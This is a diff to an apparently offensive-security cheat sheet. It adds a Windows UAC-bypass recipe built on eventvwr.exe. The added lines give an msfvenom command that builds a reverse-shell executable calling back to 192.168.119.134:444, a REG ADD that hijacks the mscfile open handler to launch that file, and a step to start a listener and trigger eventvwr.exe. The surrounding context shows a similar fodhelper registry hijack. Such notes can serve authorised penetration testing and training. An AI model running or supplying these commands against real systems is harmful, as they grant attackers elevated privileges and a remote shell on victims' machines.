@@ -1503,6 +1503,8 @@ reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
 ```
 
 ## UAC Bypass
+Check integrity level with ``whoami /groups`` or ``whoami /all``
+
 The following example uses C:\windows\system32\fodhelper.exe which is launched every time a user opens 'Manage optional features'
 1. Use [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/) and sigcheck.exe to verify integrity level
 ```
@@ -1528,6 +1530,19 @@ REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute 
 ```
 REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
 ```
+
+### Example Eventvwr.exe
+* see https://lolbas-project.github.io/lolbas/Binaries/Eventvwr/
+
+Create reverse shell .exe file
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.134 LPORT=444 -f exe -o foobar.exe
+```
+Modify Registry
+```
+REG ADD HKCU\Software\Classes\mscfile\shell\open\command /d "C:\Users\Public\Videos\foobar.exe" /f
+```
+Set up listener and run eventvwr.exe
 
 
 
